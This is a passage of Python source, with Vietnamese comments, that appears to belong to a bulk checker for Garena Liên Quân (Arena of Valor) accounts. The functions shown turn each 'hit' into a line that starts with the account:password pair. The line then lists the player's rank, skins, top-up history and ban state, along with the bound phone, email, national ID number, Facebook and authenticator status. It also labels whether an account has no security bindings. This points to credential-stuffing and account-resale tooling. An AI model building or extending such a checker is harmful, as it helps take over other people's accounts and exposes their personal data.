        return {}
    cache_key = sso_key[:16]
    cached = _CAMPUSCARD_CACHE.get(cache_key)
    if cached is not None:
        return cached
    result = _fetch_campuscard_data(sso_key, proxy)
    if result:
        _CAMPUSCARD_CACHE[cache_key] = result
    return result


def _skin_fmt(count: int, names: list) -> str:
    """Format skin tier: 'No Skin' or 'N [name1, name2]'."""
    if count == 0:
        return 'No Skin'
    return f"{count} [{', '.join(names)}]"


def _looks_like_email(value: str) -> bool:
    v = (value or "").strip()
    if not v or ":" in v or "@" not in v or v.count("@") != 1:
        return False
    local, domain = v.split("@", 1)
    return bool(local) and "." in domain and bool(domain.split(".")[-1])


def _hit_login_email(h: dict) -> str:
    """Email dùng làm tài khoản đăng nhập (khi account.garena không trả masked_email)."""
    acc_raw = str(h.get("account") or "").strip()
    if acc_raw and ":" in acc_raw and "@" in acc_raw.split(":", 1)[0]:
        acc_raw = acc_raw.split(":", 1)[0].strip()
    if _looks_like_email(acc_raw):
        return acc_raw
    user = str(h.get("username") or "").strip()
    if _looks_like_email(user):
        return user
    return ""


def _email_mask_matches_login(masked: str, login: str) -> bool:
    """So khớp email che (il***@maildrop.cc) với email đăng nhập."""
    m = (masked or "").strip().lower()
    l = (login or "").strip().lower()
    if not m or not l or "@" not in m or "@" not in l:
        return False
    if m == l:
        return True
    if "*" not in m:
        return m == l
    mp, md = m.split("@", 1)
    lp, ld = l.split("@", 1)
    if md != ld:
        return False
    vis = mp.replace("*", "")
    return bool(vis) and lp.startswith(vis)


def _hit_api_email(h: dict) -> str:
    """Email từ API (masked), không dùng email đăng nhập suy đoán."""
    masked = (h.get("masked_email") or "").strip()
    if masked and masked.replace("*", "").replace("@", "").replace(".", ""):
        return masked
    return _hit_pick_first_email(_hit_security_sources(h))


def _hit_best_email(h: dict) -> str:
    """Email hiển thị: masked/API trước, fallback email đăng nhập."""
    api_mail = _hit_api_email(h)
    if api_mail:
        return api_mail
    return _hit_login_email(h)


def _has_any_email(h: dict) -> bool:
    """True khi có email (đã gắn / đăng nhập), không đồng nghĩa đã xác thực."""
    return bool(_hit_best_email(h))

def _is_email_verified(h: dict) -> bool:
    """True khi account/init email_v=1 hoặc cờ/status verify rõ (ưu tiên account/init hơn CMD 342)."""
    if not isinstance(h, dict):
        return False
    st = str(h.get("email_status", "") or "").strip().lower()
    if st in {"verified", "confirmed", "done", "success"}:
        return True
    if st in {"unverified", "pending", "inactive", "none", "false", "0"}:
        return False
    if "email_v" in h:
        return _truthy_email_v(h.get("email_v"))
    for src in _hit_security_sources(h):
        if not isinstance(src, dict):
            continue
        if "email_v" in src:
            return _truthy_email_v(src.get("email_v"))
        if _user_info_says_email_verified(src):
            return True
    return bool(h.get("email_verified"))

def _has_any_phone(h: dict) -> bool:
    """True if account shows any phone signal from all known sources."""
    if bool(h.get('mobile_bound')):
        return True
    prefill_phone = (h.get('aov_prefill_mobile') or '').strip()
    if prefill_phone:
        return True
    masked_phone = (h.get('masked_phone') or '').strip()
    if masked_phone:
        return True
    return bool(_hit_pick_first_phone(_hit_security_sources(h)))

def _derive_tinh_trang(h: dict) -> str:
    """Derive account status description from bindings (SĐT/Mail/FB/CCCD/2FA đã gắn thật)."""
    # Chỉ tính "Mail" khi email đã xác thực (email che chưa verify = Acc Trắng).
    has_email = _is_email_verified(h)
    has_phone = _has_any_phone(h)
    fb = _hit_fb_linked_from_sources(h)
    ic_raw = (h.get("idcard", "") or "").strip() or _hit_pick_first_idcard(_hit_security_sources(h))
    cccd = bool(ic_raw.replace("*", ""))
    auth = _hit_has_authenticator(h)

    parts = []
    if has_phone:
        parts.append("SĐT")
    if has_email:
        parts.append("Mail")
    if fb:
        parts.append("FB")
    if cccd:
        parts.append("CCCD")
    if auth:
        parts.append("2FA")
    
    total = len(parts)
    if total == 0:
        return 'Acc Trắng'
    elif total >= 4:
        return 'Full Info'
    else:
        return 'Acc Dính ' + ' + '.join(parts)

_INVALID_COUNTRY_TOKENS = frozenset({
    "", "ZZ", "XX", "XA", "UN", "EU", "QU", "UNKNOWN", "N/A", "NA", "NONE", "NULL",
})


def _country_token_usable(raw) -> bool:
    s = str(raw or "").strip().upper()
    return bool(s) and s not in _INVALID_COUNTRY_TOKENS


def _normalize_country(code: str) -> str:
    if not code:
        return "UNKNOWN"
    code = str(code).strip().upper()
    if not _country_token_usable(code):
        return "UNKNOWN"
    mapping = {
        "AF": "AFGHANISTAN",
        "AX": "ÅLAND ISLANDS",
        "AL": "ALBANIA",
        "DZ": "ALGERIA",
        "AS": "AMERICAN SAMOA",
        "AD": "ANDORRA",
        "AO": "ANGOLA",
        "AI": "ANGUILLA",
        "AQ": "ANTARCTICA",
        "AG": "ANTIGUA AND BARBUDA",
        "AR": "ARGENTINA",
        "AM": "ARMENIA",
        "AW": "ARUBA",
        "AU": "AUSTRALIA",
        "AT": "AUSTRIA",
        "AZ": "AZERBAIJAN",
        "BS": "BAHAMAS",
        "BH": "BAHRAIN",
        "BD": "BANGLADESH",
        "BB": "BARBADOS",
        "BY": "BELARUS",
        "BE": "BELGIUM",
        "BZ": "BELIZE",
        "BJ": "BENIN",
        "BM": "BERMUDA",
        "BT": "BHUTAN",
        "BO": "BOLIVIA, PLURINATIONAL STATE OF",
        "BQ": "BONAIRE, SINT EUSTATIUS AND SABA",
        "BA": "BOSNIA AND HERZEGOVINA",
        "BW": "BOTSWANA",
        "BV": "BOUVET ISLAND",
        "BR": "BRAZIL",
        "IO": "BRITISH INDIAN OCEAN TERRITORY",
        "BN": "BRUNEI DARUSSALAM",
        "BG": "BULGARIA",
        "BF": "BURKINA FASO",
        "BI": "BURUNDI",
        "KH": "CAMBODIA",
        "CM": "CAMEROON",
        "CA": "CANADA",
        "CV": "CAPE VERDE",
        "KY": "CAYMAN ISLANDS",
        "CF": "CENTRAL AFRICAN REPUBLIC",
        "TD": "CHAD",
        "CL": "CHILE",
        "CN": "CHINA",
        "CX": "CHRISTMAS ISLAND",
        "CC": "COCOS (KEELING) ISLANDS",
        "CO": "COLOMBIA",
        "KM": "COMOROS",
        "CG": "CONGO",
        "CD": "CONGO, THE DEMOCRATIC REPUBLIC OF THE",
        "CK": "COOK ISLANDS",
        "CR": "COSTA RICA",
        "HR": "CROATIA",
        "CU": "CUBA",
        "CW": "CURAÇAO",
        "CY": "CYPRUS",
        "CZ": "CZECH REPUBLIC",
        "DK": "DENMARK",
        "DJ": "DJIBOUTI",
        "DM": "DOMINICA",
        "DO": "DOMINICAN REPUBLIC",
        "EC": "ECUADOR",
        "EG": "EGYPT",
        "SV": "EL SALVADOR",
        "GQ": "EQUATORIAL GUINEA",
        "ER": "ERITREA",
        "EE": "ESTONIA",
        "ET": "ETHIOPIA",
        "FK": "FALKLAND ISLANDS (MALVINAS)",
        "FO": "FAROE ISLANDS",
        "FJ": "FIJI",
        "FI": "FINLAND",
        "FR": "FRANCE",
        "GF": "FRENCH GUIANA",
        "PF": "FRENCH POLYNESIA",
        "TF": "FRENCH SOUTHERN TERRITORIES",
        "GA": "GABON",
        "GM": "GAMBIA",
        "GE": "GEORGIA",
        "DE": "GERMANY",
        "GH": "GHANA",
        "GI": "GIBRALTAR",
        "GR": "GREECE",
        "GL": "GREENLAND",
        "GD": "GRENADA",
        "GP": "GUADELOUPE",
        "GU": "GUAM",
        "GT": "GUATEMALA",
        "GG": "GUERNSEY",
        "GN": "GUINEA",
        "GW": "GUINEA-BISSAU",
        "GY": "GUYANA",
        "HT": "HAITI",
        "HM": "HEARD ISLAND AND MCDONALD ISLANDS",
        "VA": "HOLY SEE (VATICAN CITY STATE)",
        "HN": "HONDURAS",
        "HK": "HONG KONG",
        "HU": "HUNGARY",
        "IS": "ICELAND",
        "IN": "INDIA",
        "ID": "INDONESIA",
        "IR": "IRAN, ISLAMIC REPUBLIC OF",
        "IQ": "IRAQ",
        "IE": "IRELAND",
        "IM": "ISLE OF MAN",
        "IL": "ISRAEL",
        "IT": "ITALY",
        "JM": "JAMAICA",
        "JP": "JAPAN",
        "JE": "JERSEY",
        "JO": "JORDAN",
        "KZ": "KAZAKHSTAN",
        "KE": "KENYA",
        "KI": "KIRIBATI",
        "KR": "KOREA, REPUBLIC OF",
        "KW": "KUWAIT",
        "KG": "KYRGYZSTAN",
        "LV": "LATVIA",
        "LB": "LEBANON",
        "LS": "LESOTHO",
        "LR": "LIBERIA",
        "LY": "LIBYA",
        "LI": "LIECHTENSTEIN",
        "LT": "LITHUANIA",
        "LU": "LUXEMBOURG",
        "MO": "MACAO",
        "MK": "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF",
        "MG": "MADAGASCAR",
        "MW": "MALAWI",
        "MY": "MALAYSIA",
        "MV": "MALDIVES",
        "ML": "MALI",
        "MT": "MALTA",
        "MH": "MARSHALL ISLANDS",
        "MQ": "MARTINIQUE",
        "MR": "MAURITANIA",
        "MU": "MAURITIUS",
        "YT": "MAYOTTE",
        "MX": "MEXICO",
        "FM": "MICRONESIA, FEDERATED STATES OF",
        "MD": "MOLDOVA, REPUBLIC OF",
        "MC": "MONACO",
        "MN": "MONGOLIA",
        "ME": "MONTENEGRO",
        "MS": "MONTSERRAT",
        "MA": "MOROCCO",
        "MZ": "MOZAMBIQUE",
        "MM": "MYANMAR",
        "NA": "NAMIBIA",
        "NR": "NAURU",
        "NP": "NEPAL",
        "NL": "NETHERLANDS",
        "NC": "NEW CALEDONIA",
        "NZ": "NEW ZEALAND",
        "NI": "NICARAGUA",
        "NE": "NIGER",
        "NG": "NIGERIA",
        "NU": "NIUE",
        "NF": "NORFOLK ISLAND",
        "MP": "NORTHERN MARIANA ISLANDS",
        "NO": "NORWAY",
        "OM": "OMAN",
        "PK": "PAKISTAN",
        "PW": "PALAU",
        "PS": "PALESTINE, STATE OF",
        "PA": "PANAMA",
        "PG": "PAPUA NEW GUINEA",
        "PY": "PARAGUAY",
        "PE": "PERU",
        "PH": "PHILIPPINES",
        "PN": "PITCAIRN",
        "PL": "POLAND",
        "PT": "PORTUGAL",
        "PR": "PUERTO RICO",
        "QA": "QATAR",
        "RE": "RÉUNION",
        "RO": "ROMANIA",
        "RU": "RUSSIAN FEDERATION",
        "RW": "RWANDA",
        "BL": "SAINT BARTHÉLEMY",
        "SH": "SAINT HELENA, ASCENSION AND TRISTAN DA CUNHA",
        "KN": "SAINT KITTS AND NEVIS",
        "LC": "SAINT LUCIA",
        "MF": "SAINT MARTIN (FRENCH PART)",
        "PM": "SAINT PIERRE AND MIQUELON",
        "VC": "SAINT VINCENT AND THE GRENADINES",
        "WS": "SAMOA",
        "SM": "SAN MARINO",
        "ST": "SAO TOME AND PRINCIPE",
        "SA": "SAUDI ARABIA",
        "SN": "SENEGAL",
        "RS": "SERBIA",
        "SC": "SEYCHELLES",
        "SL": "SIERRA LEONE",
        "SG": "SINGAPORE",
        "SX": "SINT MAARTEN (DUTCH PART)",
        "SK": "SLOVAKIA",
        "SI": "SLOVENIA",
        "SB": "SOLOMON ISLANDS",
        "SO": "SOMALIA",
        "ZA": "SOUTH AFRICA",
        "GS": "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
        "SS": "SOUTH SUDAN",
        "ES": "SPAIN",
        "LK": "SRI LANKA",
        "SD": "SUDAN",
        "SR": "SURINAME",
        "SJ": "SVALBARD AND JAN MAYEN",
        "SZ": "SWAZILAND",
        "SE": "SWEDEN",
        "CH": "SWITZERLAND",
        "SY": "SYRIAN ARAB REPUBLIC",
        "TW": "TAIWAN, PROVINCE OF CHINA",
        "TJ": "TAJIKISTAN",
        "TZ": "TANZANIA, UNITED REPUBLIC OF",
        "TH": "THAILAND",
        "TL": "TIMOR-LESTE",
        "TG": "TOGO",
        "TK": "TOKELAU",
        "TO": "TONGA",
        "TT": "TRINIDAD AND TOBAGO",
        "TN": "TUNISIA",
        "TR": "TURKEY",
        "TM": "TURKMENISTAN",
        "TC": "TURKS AND CAICOS ISLANDS",
        "TV": "TUVALU",
        "UG": "UGANDA",
        "UA": "UKRAINE",
        "AE": "UNITED ARAB EMIRATES",
        "GB": "UNITED KINGDOM",
        "US": "UNITED STATES",
        "UM": "UNITED STATES MINOR OUTLYING ISLANDS",
        "UY": "URUGUAY",
        "UZ": "UZBEKISTAN",
        "VU": "VANUATU",
        "VE": "VENEZUELA, BOLIVARIAN REPUBLIC OF",
        "VN": "VIET NAM",
        "VG": "VIRGIN ISLANDS, BRITISH",
        "VI": "VIRGIN ISLANDS, U.S.",
        "WF": "WALLIS AND FUTUNA",
        "EH": "WESTERN SAHARA",
        "YE": "YEMEN",
        "ZM": "ZAMBIA",
        "ZW": "ZIMBABWE",
        "84": "VIETNAM",
        "63": "PHILIPPINES",
        "66": "THAILAND",
        "62": "INDONESIA",
        "65": "SINGAPORE",
        "60": "MALAYSIA",
        "886": "TAIWAN",
        "91": "INDIA",
        "95": "MYANMAR",
        "855": "CAMBODIA",
        "856": "LAOS",
    }

    out = mapping.get(code)
    if out:
        return out
    if len(code) == 2 and code.isalpha():
        return "UNKNOWN"
    return code

def _format_rank(rank: str) -> str:
    if not rank:
        return ""
    s = str(rank).strip()
    s = re.sub(r"\s+", " ", s).strip()
    low = s.lower()
    if "kim cương" in low or "kim cuong" in low or re.search(r"\bk\s*\.\s*c(?:uong|ương)\b", low):
        tail = re.sub(r"(?i)kim\s*c(?:uong|ương)|k\s*\.\s*c(?:uong|ương)", "", s).strip()
        return ("K.Cương " + tail).strip()
    if "tinh anh" in low or "tinh_anh" in low or "tinh-anh" in low or "tinhanh" in low or re.search(r"\bt\s*\.\s*anh\b", low):
        tail = re.sub(r"(?i)tinh\s*anh|tinh_anh|tinh-anh|tinhanh|t\s*\.\s*anh", "", s).strip()
        return ("T.Anh " + tail).strip()
    if "chiến tướng" in low or "chien tuong" in low:
        tail = re.sub(r"(?i)chiến\s*tướng|chien\s*tuong", "", s).strip()
        if tail.isdigit():
            tail = ""
        return ("Chiến Tướng " + tail).strip()
    if "thách đấu" in low or "thach dau" in low:
        tail = re.sub(r"(?i)thách\s*đấu|thach\s*dau", "", s).strip()
        if tail.isdigit():
            tail = ""
        return ("Thách Đấu " + tail).strip()
    if "cao thủ" in low or "cao thu" in low:
        tail = re.sub(r"(?i)cao\s*thủ|cao\s*thu", "", s).strip()
        if tail.isdigit():
            tail = ""
        return ("Cao Thủ " + tail).strip()
    return s

def _expand_rank_abbrev_for_tier_match(rank_raw: str) -> str:
    """Đồng bộ nhận diện tier với dạng hiển thị K.Cương / T.Anh (_format_rank)."""
    if not (rank_raw or "").strip():
        return (rank_raw or "").strip()
    s = rank_raw.strip()
    low = re.sub(r"\s+", " ", s.lower()).strip()
    if re.search(r"\bk\s*\.\s*c(?:ương|uong)\b", low) or "k.cương" in low:
        return re.sub(r"(?i)\bk\s*\.\s*c(?:ương|uong)\b", "Kim Cương", s, count=1)
    if re.search(r"\bt\s*\.\s*anh\b", low):
        return re.sub(r"(?i)\bt\s*\.\s*anh\b", "Tinh Anh", s, count=1)
    return s

def _extract_master_stars(rank_raw: str) -> int:
    """Lấy số sao Cao Thủ từ chuỗi rank. Trả về 1-50 nếu là Cao Thủ, 0 nếu không xác định.
    Cao Thủ trong AOV có tới 50 sao trước khi lên Chiến Tướng.
    Hỗ trợ: 'Cao Thủ 6', 'cao thu 12', 'Master 50', 'cao_thu_25', v.v.
    """
    if not rank_raw:
        return 0
    s = str(rank_raw).strip().lower()
    s = unicodedata.normalize("NFKD", s).encode("ascii", "ignore").decode("ascii")
    s = re.sub(r"[_\-]+", " ", s)
    # Chỉ áp dụng với Cao Thủ (master)
    if not re.search(r"cao\s*thu|\bmaster\b", s):
        return 0
    # Tìm số liền sau tên rank (1-50)
    m = re.search(r"(?:cao\s*thu|master)\s*(\d{1,2})", s)
    if m:
        n = int(m.group(1))
        if 1 <= n <= 50:
            return n
    # Tìm số bất kỳ trong chuỗi (1-50)
    m2 = re.search(r"\b(\d{1,2})\b", s)
    if m2:
        n = int(m2.group(1))
        if 1 <= n <= 50:
            return n
    return 0


def _is_aov_hit_incomplete(h: dict) -> bool:
    """Có rank/skin/champ LQ nhưng cấp = 0 → dữ liệu lỗi, cần check lại."""
    sk = h.get("aov_skins") if isinstance(h.get("aov_skins"), dict) else {}
    try:
        ts = int(sk.get("total_skins") or 0)
        tc = int(sk.get("total_champs") or 0)
    except (TypeError, ValueError):
        ts, tc = 0, 0
    rank = (h.get("aov_rank") or "").strip()
    name = (h.get("aov_name") or h.get("nickname") or "").strip()
    if not (rank or name or ts >= 8 or tc >= 5):
        return False
    return _hit_display_aov_level(h) <= 0


def _refill_aov_gaps(
    result: dict,
    sock,
    session_key: bytes,
    aov_token: str,
    reg_aov: str,
    proxy=None,
) -> None:
    """Bổ sung cấp/QH khi thiếu — không gọi lại security nếu đã đủ."""
    if not result.get("_acct_sec_ok") and not _result_has_security_data(result):
        _refill_security_bindings(result, sock, session_key, aov_token, proxy)
    if not aov_token or not HAS_REQUESTS:
        return
    ai = result.get("aov_user_info")
    if not isinstance(ai, dict) or not ai:
        ai = _fetch_aov_user_info(aov_token, reg_aov, proxy) or {}
    if isinstance(ai, dict) and ai:
        result["aov_user_info"] = ai
        try:
            pm = ((ai.get("data") or {}).get("prefill_mobile") or "").strip()
        except Exception:
            pm = ""
        if pm and not (result.get("aov_prefill_mobile") or "").strip():
            result["aov_prefill_mobile"] = pm
        clv = _aov_level_from_connect_payload(ai)
        if clv > 0:
            result["aov_level"] = max(int(result.get("aov_level") or 0), clv)
        cqh = _aov_qh_from_connect_payload(ai)
        if cqh > 0:
            skm = dict(result.get("aov_skins") or {})
            if cqh > int(skm.get("cp", 0) or 0):
                skm["cp"] = cqh
                result["aov_skins"] = skm
    if _hit_display_aov_level(result) <= 0:
        wm2 = _fetch_weekly_profile(aov_token, proxy, reg_aov) or {}
        if wm2:
            _enrich_result_from_weekly_gaps(result, wm2)
    if _hit_display_aov_level(result) <= 0 and sock and session_key:
        kt2 = _fetch_kientuong_player(sock, session_key, proxy=proxy)
        if kt2:
            _merge_kientuong_snapshot(result, kt2)


def _hit_display_aov_level(h: dict) -> int:
    """Cấp LQ hiển thị: dùng aov_level, fallback level trong _kt_player nếu thiếu/khác API."""
    try:
        lv = int(h.get("aov_level") or 0)
    except (TypeError, ValueError):
        lv = 0
    kt = h.get("_kt_player")
    if isinstance(kt, dict):
        try:
            klv = int(kt.get("level") or 0)
        except (TypeError, ValueError):
            klv = 0
        if 1 <= klv <= 40 and klv > lv:
            lv = klv
    return lv


def _hit_flag_int(v) -> int:
    """0/1 cho authenticator / two_step / cờ số dạng str từ API."""
    if v is None:
        return 0
    if isinstance(v, bool):
        return 1 if v else 0
    if isinstance(v, (int, float)):
        return 1 if int(v) != 0 else 0
    if isinstance(v, str):
        s = v.strip().lower()
        if s in ("", "0", "false", "no", "off", "null", "none"):
            return 0
        if s in ("1", "true", "yes", "y", "on"):
            return 1
        try:
            return 1 if int(float(s)) != 0 else 0
        except ValueError:
            return 0
    return 0


def _hit_security_sources(h: dict) -> list:
    """Các dict gốc + data lồng từ connect game (field hay lệch chỗ)."""
    if not isinstance(h, dict):
        return []
    out = [h]
    for root_key in ("aov_user_info",):
        root = h.get(root_key)
        if isinstance(root, dict):
            out.append(root)
            d = root.get("data")
            if isinstance(d, dict):
                out.append(d)
    return out


def _hit_pick_first_phone(sources: list) -> str:
    keys = (
        "prefill_mobile",
        "mobile",
        "phone",
        "mobile_no",
        "bind_phone",
        "masked_phone",
        "tel",
    )
    for src in sources:
        if not isinstance(src, dict):
            continue
        for k in keys:
            v = (src.get(k) or "").strip()
            if not v:
                continue
            if v.replace("*", "").replace("+", "").replace(" ", "").replace("-", ""):
                return v
    return ""


def _hit_pick_first_email(sources: list) -> str:
    for src in sources:
        if not isinstance(src, dict):
            continue
        for k in ("masked_email", "email", "mail"):
            v = (src.get(k) or "").strip()
            if v and v.replace("*", "").replace("@", "").replace(".", ""):
                return v
    return ""


def _hit_pick_first_idcard(sources: list) -> str:
    for src in sources:
        if not isinstance(src, dict):
            continue
        for k in ("idcard", "id_card", "identity_no", "identity"):
            v = (src.get(k) or "").strip()
            if v and v.replace("*", ""):
                return v
    return ""


def _hit_fb_linked_from_sources(h: dict) -> bool:
    if bool(h.get("fb_linked")):
        return True
    for src in _hit_security_sources(h):
        if not isinstance(src, dict):
            continue
        if bool(src.get("fb_connected")) or bool(src.get("is_fb_connected")) or bool(
            src.get("is_fbconnect_enabled")
        ):
            return True
        for fk in ("facebook_id", "fb_uid", "fb_id", "fb_user_id"):
            fv = src.get(fk)
            if fv not in (None, "", 0, "0", False):
                return True
        fa = str(src.get("fb_account") or src.get("fb_name") or "").strip()
        if fa and fa not in ("{}", "[]", "null"):
            return True
    return False


def _hit_authen_flags(h: dict) -> tuple:
    """(authenticator_enable, two_step) int 0/1 — chỉ từ account/init trên result gốc."""
    if not isinstance(h, dict):
        return 0, 0
    auth = _hit_flag_int(h.get("authenticator_enable"))
    two = _hit_flag_int(h.get("two_step_verify"))
    return auth, two


def _hit_has_authenticator(h: dict) -> bool:
    """Authen = Garena Authenticator app (không suy từ SĐT / two_step SMS)."""
    return _hit_authen_flags(h)[0] == 1


# ── Bulk loader ───────────────────────────────────────────────────────────────
def _format_hit_line(h: dict) -> str:
    """Format a HIT result in themed Liên Quân output style."""
    sk = h.get('aov_skins', {})
    sec = _hit_security_sources(h)

    # ── Email ──
    best_email = _hit_best_email(h)
    has_email = _has_any_email(h)
    email_verified = _is_email_verified(h)
    email_verify_status = "ĐÃ XÁC THỰC" if email_verified else "CHƯA XÁC THỰC"
    if best_email:
        email_str = f"Yes [{best_email}] ({email_verify_status})"
    elif has_email:
        email_str = f"Yes ({email_verify_status})"
    else:
        email_str = "No"

    # ── SĐT ──
    # Uu tien so day du tu prefill, fallback sang masked_phone / nested
    _prefill_phone = (h.get('aov_prefill_mobile') or '').strip()
    masked_phone = (h.get('masked_phone', '') or '').strip()
    _nested_phone = _hit_pick_first_phone(sec)
    _best_phone = _prefill_phone or masked_phone or _nested_phone
    if _best_phone:
        sdt_str = f"Yes [{_best_phone}]"
    elif _has_any_phone(h):
        sdt_str = 'Yes'
    else:
        sdt_str = 'No'

    # ── Pass ──
    pass_str = 'Yes' if h.get('password_set') else 'No'

    # ── FB ──
    if _hit_fb_linked_from_sources(h):
        _fbn = (h.get("fb_account_name") or "").strip()
        fb_str = f"Yes [{_fbn}]" if _fbn else "Yes"
    else:
        fb_str = "No"

    # ── Ban ──
    ban_raw = h.get('aov_banned', 'NO')
    is_banned = _is_yes(ban_raw)
    ban_str = 'Ban' if is_banned else 'No'

    # ── CCCD (new) ──
    idcard = (h.get('idcard', '') or '').strip() or _hit_pick_first_idcard(sec)
    if idcard and idcard.replace('*', ''):
        cccd_str = f'Yes [{idcard}]'
    else:
        cccd_str = 'No'

    # ── Authen = Garena Authenticator app (không phải bind SĐT / SMS 2-step) ──
    authen_str = 'Yes' if _hit_has_authenticator(h) else 'No'

    # Build themed output order
    acc_pw = f"{h.get('account', '')}:{h.get('password', '')}"
    aov_name = (h.get('aov_name') or h.get('nickname') or "").strip() or "N/A"
    aov_lv = _hit_display_aov_level(h)
    aov_rank = h.get('aov_rank', '')
    rank_stars = int(h.get('aov_rank_stars', 0) or 0)
    if aov_rank:
        base_formatted = _format_rank(aov_rank)
        # Bất kỳ rank nào có sao > 0 đều xuất dạng [sao ⭐] giống check_rank_ban
        if rank_stars > 0:
            rank_str = f"{base_formatted} [{rank_stars} ⭐]"
        else:
            rank_str = base_formatted
    else:
        rank_str = "Chưa có"
    country = _country_label_hit(h)
    topup = h.get("topup_time", 0) or 0
    last_login = _fmt_last_login(h.get('last_login', ''))

    ss_cnt = int(sk.get('ss', 0) or 0)
    sss_cnt = int(sk.get('sss', 0) or 0)
    anime_cnt = int(sk.get('anime', 0) or 0)
    other_cnt = int(sk.get('other', 0) or 0)

    parts = [acc_pw]
    parts.append(f"Name: {aov_name}")
    parts.append(f"Level: {aov_lv}")
    parts.append(f"Rank: {rank_str}")
    parts.append(f"Quân Huy: {sk.get('cp', 0)}")
    parts.append(f"Lịch Sử Nạp: {topup}")
    parts.append(f"Vô Game Lần Cuối: {last_login}")
    parts.append(f"Sò: {h.get('shells', 0)}")
    parts.append(f"Quốc Gia: {country}")
    parts.append(f"Tướng: {sk.get('total_champs', 0)}")
    parts.append(f"Skin: {sk.get('total_skins', 0)}")
    parts.append(f"Authen: {authen_str}")
    parts.append(f"SĐT: {sdt_str}")
    parts.append(f"Email: {email_str}")
    parts.append(f"CCCD: {cccd_str}")
    parts.append(f"FB: {fb_str}")
    parts.append(f"Ban: {ban_str}")
    ban_end = (h.get('aov_unban_time') or '').strip()
    if is_banned and ban_end:
        parts.append(f"Mở Ban: {ban_end}")
    parts.append(f"SS: {_skin_fmt(ss_cnt, sk.get('ss_list', []))}")
    parts.append(f"SSS: {_skin_fmt(sss_cnt, sk.get('sss_list', []))}")
    parts.append(f"Anime: {_skin_fmt(anime_cnt, sk.get('anime_list', []))}")
    parts.append(f"Other: {_skin_fmt(other_cnt, sk.get('other_list', []))}")
    parts.append(f"Tình Trạng: {_derive_tinh_trang(h)}")

    return ' | '.join(parts)


def _hit_country_iso(h: dict) -> str:
    """Mã quốc gia 2 chữ (VN, PH, TH, ...) — chỉ từ API / country đã resolve."""
    _iso_map = {
        "VIETNAM": "VN", "VIET NAM": "VN", "VIỆT NAM": "VN",
        "THAILAND": "TH", "PHILIPPINES": "PH", "INDONESIA": "ID",
        "MALAYSIA": "MY", "SINGAPORE": "SG",
        "TAIWAN": "TW", "TAIWAN, PROVINCE OF CHINA": "TW",
    }
    for raw in _api_country_raw_candidates(h):
        s = str(raw).strip().upper()
        if len(s) == 2 and s.isalpha() and _country_token_usable(s):
            return s
        n = _normalize_country(s)
        if n in _iso_map:
            return _iso_map[n]
    name = _normalize_country((h.get("country") or "").strip().upper())
    if name in _iso_map:
        return _iso_map[name]
    if name and name != "UNKNOWN" and len(name) == 2 and name not in _INVALID_COUNTRY_TOKENS:
        return name
    return "UNKNOWN"


def _hit_build_aov_ban(h: dict) -> dict:
    banned = _is_yes(h.get("aov_banned", "NO"))
    if not banned:
        return {"banned": False, "ban_type": "NONE", "ban_until": None}
    unban_raw = (h.get("aov_unban_time") or "").strip()
    ban_until = None
    if unban_raw:
        try:
            ban_until = int(unban_raw)
        except (TypeError, ValueError):
            ban_until = unban_raw
    return {"banned": True, "ban_type": "TEMP", "ban_until": ban_until}


def _hit_build_aov_skin(h: dict) -> dict:
    sk = h.get("aov_skins", {}) if isinstance(h.get("aov_skins"), dict) else {}
    return {
        "total": int(sk.get("total_skins", 0) or 0),
        "ss": int(sk.get("ss", 0) or 0),
        "sss": int(sk.get("sss", 0) or 0),
        "anime": int(sk.get("anime", 0) or 0),
        "other": int(sk.get("other", 0) or 0),
        "cp": int(sk.get("cp", 0) or 0),
        "level": _hit_display_aov_level(h),
        "rank": _format_rank(h.get("aov_rank", "")) if h.get("aov_rank") else "",
        "rank_raw": (h.get("aov_rank") or "").strip(),
        "champs": int(sk.get("total_champs", 0) or 0),
        "ss_list": sk.get("ss_list", []) or [],
        "sss_list": sk.get("sss_list", []) or [],
        "anime_list": sk.get("anime_list", []) or [],
        "other_list": sk.get("other_list", []) or [],
    }


def _hit_build_game_info(h: dict) -> list:
    iso = _hit_country_iso(h)
    games = []
    aov_name = (h.get("aov_name") or h.get("nickname") or "").strip()
    sk = h.get("aov_skins") or {}
    has_aov = bool(aov_name) or int(sk.get("total_skins", 0) or 0) > 0 or int(h.get("aov_level") or 0) > 0
    if has_aov:
        label = "ROV" if iso == "VN" else "AOV"
        games.append(f"[{iso} - {label} - {aov_name or h.get('account', '')}]")
    if not games:
        games = ["No game connections found"]
    return games


def _hit_to_cdm_record(h: dict) -> dict:
    """Format giống cdm/results/account_details.json (account + details + timestamp)."""
    sec = _hit_security_sources(h)
    acc = str(h.get("account", "") or "").strip()
    pw = str(h.get("password", "") or "").strip()

    email = _hit_best_email(h)
    if not email:
        email = "N/A"
    elif email == _hit_login_email(h) and _hit_api_email(h):
        email = _hit_api_email(h)

    _prefill_phone = (h.get("aov_prefill_mobile") or "").strip()
    masked_phone = (h.get("masked_phone", "") or "").strip()
    mobile_no = _prefill_phone or masked_phone or _hit_pick_first_phone(sec) or "N/A"

    idcard = (h.get("idcard", "") or "").strip() or _hit_pick_first_idcard(sec) or "N/A"
    realname = "N/A"
    has_cccd = bool(idcard not in ("", "N/A") and idcard.replace("*", ""))

    auth_en, two_step = _hit_authen_flags(h)
    email_verified = _is_email_verified(h)
    fb_linked = _hit_fb_linked_from_sources(h)
    mobile_bound = bool(h.get("mobile_bound")) or (
        mobile_no not in ("", "N/A")
        and bool(re.sub(r"[^\d]", "", mobile_no))
    )

    binds = []
    if email != "N/A" and email_verified:
        binds.append("Email")
    if mobile_no != "N/A" and mobile_bound:
        binds.append("Phone")
    if fb_linked:
        binds.append("Facebook")
    if has_cccd:
        binds.append("ID Card")

    country_iso = _hit_country_iso(h)
    game_info = _hit_build_game_info(h)

    id_len = "N/A"
    if has_cccd:
        plain = idcard.replace("*", "")
        id_len = len(plain) if plain else len(idcard)

    details = {
        "uid": h.get("uid", "N/A"),
        "username": (h.get("username") or acc or "N/A"),
        "nickname": (h.get("nickname") or h.get("aov_name") or acc or "N/A"),
        "email": email,
        "email_verified": email_verified,
        "email_verified_time": 0,
        "email_verify_available": False,
        "security": {
            "password_strength": "N/A",
            "two_step_verify": bool(two_step),
            "authenticator_app": bool(auth_en),
            "facebook_connected": fb_linked,
            "facebook_account": h.get("fb_account_name"),
            "suspicious": False,
        },
        "personal": {
            "real_name": realname,
            "id_card": idcard,
            "id_card_length": id_len,
            "cccd_status": "BOUND" if has_cccd else "NONE",
            "country": country_iso,
